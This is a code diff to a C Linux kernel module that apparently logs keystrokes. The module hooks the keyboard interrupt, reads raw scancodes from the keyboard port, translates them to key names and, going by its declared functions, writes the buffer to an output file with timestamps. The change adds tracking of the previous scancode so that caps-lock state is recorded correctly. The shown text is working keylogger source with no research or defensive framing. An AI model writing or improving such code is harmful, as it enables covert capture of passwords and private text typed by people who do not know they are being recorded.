@@ -29,6 +29,7 @@ int capsLockEnabled = 0;
 #define CAPS_LOCK_MODE 2
 #define SHIFT_CAPS_LOCK_MODE 3
 #define NUMBER_OF_MODES 3 // TODO: change to 4 when shift+caps_lock implemented
+unsigned char previousScancode = 0;
 
 // output file constants/variables
 #define OUTPUT_MODE 0644
@@ -57,7 +58,7 @@ int writeToFile(struct file *file, unsigned long long offset, unsigned char *dat
 void closeFile(struct file *file);
 static irqreturn_t get_scancode(int irq, void *id);
 void scancode_to_key(char scancode);
-void check_shift(unsigned char scancode);
+void check_shift_and_caps(unsigned char scancode);
 void write_buffer_to_output(void);
 void generate_timestamp(void);
 static void initialize_timers(void);
@@ -99,9 +100,9 @@ char *scancodes[][NUMBER_OF_MODES] = {
 	{"F10", "F10", "F10"}, 		{"NumLock", "NumLock", "NumLock"}, 
 	{"ScrlLck", "ScrlLck", "ScrlLck"}, 				{"Keypad-7", "Home", "Keypad-7"}, 
 	{"Keypad-8", "Up", "Keypad-8"}, 				{"Keypad-9", "PgUp", "Keypad-9"}, 
-	{"-", "-", "-"},		{"Keypad-4", "Left", "Keypad-4"},
+	{"-", "-", "-"},						{"Keypad-4", "Left", "Keypad-4"},
 	{"Keypad-5", "Keypad-5", "Keypad-5"},				{"Keypad-6", "Right", "Keypad-6"},
-	{"+", "+", "+"}, 		{"Keypad-1", "End", "Keypad-1"}, 
+	{"+", "+", "+"}, 						{"Keypad-1", "End", "Keypad-1"}, 
 	{"Keypad-2", "Down", "Keypad-2"}, 				{"Keypad-3", "PgDn", "Keypad-3"},
 	{"Keypad-0", "Ins", "Keypad-0"}, 				{"Keypad-.", "Del", "Keypad-."}, 
 	{"Alt-SysRq", "Alt-SysRq", "Alt-SysRq"}, 			{"\0", "\0", "\0"}, 
@@ -151,7 +152,7 @@ static irqreturn_t get_scancode(int irq, void *id)
 {
 	unsigned char scancode;
 	scancode = inb(KBD_INPUT_PORT);
-	check_shift(scancode);
+	check_shift_and_caps(scancode);
 	scancode_to_key(scancode);
 	return IRQ_HANDLED;
 }
@@ -203,8 +204,8 @@ void scancode_to_key(char scancode)
 }
 
 // checks if shift or caps lock were pressed
-void check_shift(unsigned char scancode)
-{
+void check_shift_and_caps(unsigned char scancode)
+{	
 	if (scancode == LEFT_SHIFT || scancode == RIGHT_SHIFT)
 	{
 		printk("Shift now enabled.");
@@ -219,18 +220,21 @@ void check_shift(unsigned char scancode)
 
 	if (scancode == CAPS_LOCK && capsLockEnabled == 0)
 	{
-		printk("Caps Lock now enabled.");
-		capsLockEnabled = 1;
+		if (previousScancode != CAPS_LOCK) {
+			printk("Caps Lock now enabled.");
+			capsLockEnabled = 1;
+		}
 	}
 
-	//TODO: implement
-/*
-	if (scancode == CAPS_LOCK && capsLockEnabled == 1)
+	else if (scancode == CAPS_LOCK && capsLockEnabled == 1)
 	{
-		printk("Caps Lock now disabled.");
-		capsLockEnabled = 0;
+		if (previousScancode != CAPS_LOCK) {
+			printk("Caps Lock now disabled.");
+			capsLockEnabled = 0;
+		}
 	}
-*/
+
+	previousScancode = scancode;
 }
 
 // writes all the characters stored in the buffer to the output file
